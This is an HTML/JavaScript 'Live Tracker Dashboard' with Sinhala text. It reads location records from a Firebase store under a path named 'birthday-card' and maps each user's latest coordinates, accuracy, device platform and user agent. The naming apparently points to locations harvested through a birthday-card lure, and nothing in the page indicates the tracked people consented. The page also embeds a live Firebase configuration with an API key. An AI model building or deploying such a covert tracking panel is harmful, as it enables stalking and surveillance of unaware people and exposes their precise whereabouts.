<!DOCTYPE html>
<html lang="si">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Location Tracker </title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@400;600;700&family=Yaldevi:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <style>
        body { font-family: 'Quicksand', 'Yaldevi', sans-serif; background-color: #f8fafc; }
        #map { height: 450px; border-radius: 1.5rem; z-index: 10; width: 100%; }
        .glass-card { background: rgba(255, 255, 255, 0.9); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.1); }
        .user-item { transition: all 0.3s ease; border-left: 4px solid transparent; cursor: pointer; }
        .user-item.active { background-color: #eff6ff; border-left-color: #3b82f6; }
        .custom-scroll::-webkit-scrollbar { width: 6px; }
        .custom-scroll::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 10px; }
    </style>
</head>
<body class="p-4 md:p-10">

    <div class="max-w-7xl mx-auto space-y-6">
        <div class="flex flex-col md:flex-row md:items-center justify-between gap-4">
            <div>
                <h1 class="text-3xl font-bold text-gray-900">🌍 Live Tracker Dashboard</h1>
                <p class="text-gray-500 font-medium">සියලුම පරිශීලකයින්ගේ සජීවී දත්ත මෙතැනින් බලන්න</p>
            </div>
            <div class="bg-green-100 text-green-700 px-4 py-2 rounded-full text-sm font-bold flex items-center gap-2">
                <span class="h-3 w-3 bg-green-500 rounded-full animate-ping"></span> සජීවීව සම්බන්ධයි
            </div>
        </div>

        <div class="grid grid-cols-1 lg:grid-cols-12 gap-6">
            <!-- User List -->
            <div class="lg:col-span-4 glass-card rounded-3xl shadow-sm border border-gray-200 h-[600px] flex flex-col overflow-hidden">
                <div class="p-5 border-b bg-gray-50/50">
                    <h2 class="font-bold text-gray-800">පරිශීලකයින් (<span id="userCount">0</span>)</h2>
                </div>
                <div id="userList" class="flex-1 overflow-y-auto custom-scroll p-2 space-y-1">
                    <div class="p-8 text-center text-gray-400">Loading...</div>
                </div>
            </div>

            <!-- Map & Details -->
            <div class="lg:col-span-8 space-y-6">
                <div class="glass-card p-4 rounded-3xl shadow-lg border border-gray-100">
                    <div id="map"></div>
                </div>
                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div class="glass-card p-6 rounded-2xl shadow-sm border border-gray-100 flex items-center gap-4">
                        <div class="p-3 bg-blue-100 rounded-xl text-blue-600">📍</div>
                        <div>
                            <p class="text-lg font-bold text-gray-800" id="cordData">තෝරාගෙන නැත</p>
                            <p class="text-xs text-gray-500" id="accuracyData">Accuracy: -</p>
                        </div>
                    </div>
                    <div class="glass-card p-6 rounded-2xl shadow-sm border border-gray-100 flex items-center gap-4">
                        <div class="p-3 bg-purple-100 rounded-xl text-purple-600">📱</div>
                        <div class="overflow-hidden">
                            <p class="text-sm font-bold text-gray-800 truncate" id="platformData">Device Info</p>
                            <p class="text-xs text-gray-500 truncate" id="userAgentData">-</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
        import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-auth.js";
        import { getFirestore, collectionGroup, onSnapshot, query, collection, getDocs } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyCbqDvrvNDn3lF31LYRq5O4PDpp-VSxIwc",
            authDomain: "data-a0ce0.firebaseapp.com",
            projectId: "data-a0ce0",
            storageBucket: "data-a0ce0.firebasestorage.app",
            messagingSenderId: "737698119491",
            appId: "1:737698119491:web:64f8d1f77d2fc05b8ff9f6"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getFirestore(app);

        let map = L.map('map').setView([7.8731, 80.7718], 7);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
        let activeMarker, activeCircle;

        signInAnonymously(auth).then(() => {
            fetchAllUserLocations();
        });

        function fetchAllUserLocations() {
            const userListEl = document.getElementById('userList');
            
            // අපි කෙලින්ම 'locations' කියන collection group එක query කරමු.
            // එතකොට artifacts/birthday-card/users/{any}/locations ඇතුළේ තියෙන ඔක්කොම එනවා.
            // වැදගත්: ඔයාගේ Firestore rules වල මේ path එකට read අවසර තියෙන්න ඕනේ.
            const locationsQuery = collectionGroup(db, 'locations');

            onSnapshot(locationsQuery, (snapshot) => {
                const uniqueUsers = {};
                
                snapshot.docs.forEach(doc => {
                    // path එකෙන් userId එක අරගන්නවා (artifacts/birthday-card/users/USER_ID/locations/DOC_ID)
                    const pathSegments = doc.ref.path.split('/');
                    const userId = pathSegments[3]; 
                    const data = doc.data();

                    // අලුත්ම location එක විතරක් තියාගන්නවා
                    if (!uniqueUsers[userId] || (data.timestamp?.toMillis() > uniqueUsers[userId].timestamp?.toMillis())) {
                        uniqueUsers[userId] = { id: userId, ...data };
                    }
                });

                renderUserList(Object.values(uniqueUsers));
            }, (err) => {
                userListEl.innerHTML = `<div class="p-4 text-red-500 text-sm">Error: ${err.message}</div>`;
            });
        }

        function renderUserList(users) {
            const userListEl = document.getElementById('userList');
            const userCountEl = document.getElementById('userCount');
            userListEl.innerHTML = '';
            userCountEl.textContent = users.length;

            if (users.length === 0) {
                userListEl.innerHTML = '<div class="p-8 text-center text-gray-400">කිසිදු දත්තයක් හමු නොවීය.</div>';
                return;
            }

            users.sort((a, b) => (b.timestamp?.toMillis() || 0) - (a.timestamp?.toMillis() || 0));

            users.forEach(user => {
                const div = document.createElement('div');
                div.className = 'user-item p-4 border-b border-gray-100 flex items-center justify-between hover:bg-gray-50';
                div.innerHTML = `
                    <div class="flex items-center gap-3">
                        <div class="w-10 h-10 rounded-full bg-blue-500 flex items-center justify-center text-white font-bold">${user.id.substring(0,2).toUpperCase()}</div>
                        <div>
                            <p class="text-sm font-bold text-gray-800">ID: ${user.id.substring(0,8)}...</p>
                            <p class="text-[10px] text-gray-400">${user.timestamp?.toDate().toLocaleString() || ''}</p>
                        </div>
                    </div>
                `;
                div.onclick = () => {
                    document.querySelectorAll('.user-item').forEach(i => i.classList.remove('active'));
                    div.classList.add('active');
                    showOnMap(user);
                };
                userListEl.appendChild(div);
            });
        }

        function showOnMap(data) {
            document.getElementById('cordData').textContent = `${data.lat.toFixed(6)}, ${data.lng.toFixed(6)}`;
            document.getElementById('accuracyData').textContent = `Accuracy: ${Math.round(data.accuracy)}m`;
            document.getElementById('platformData').textContent = data.platform || 'Unknown Device';
            document.getElementById('userAgentData').textContent = data.userAgent || '-';

            const latlng = [data.lat, data.lng];
            if (activeMarker) map.removeLayer(activeMarker);
            if (activeCircle) map.removeLayer(activeCircle);

            activeMarker = L.marker(latlng).addTo(map).bindPopup(data.id).openPopup();
            activeCircle = L.circle(latlng, { radius: data.accuracy, color: '#3b82f6', fillOpacity: 0.1 }).addTo(map);
            map.setView(latlng, 16);
        }
    </script>
</body>
</html>
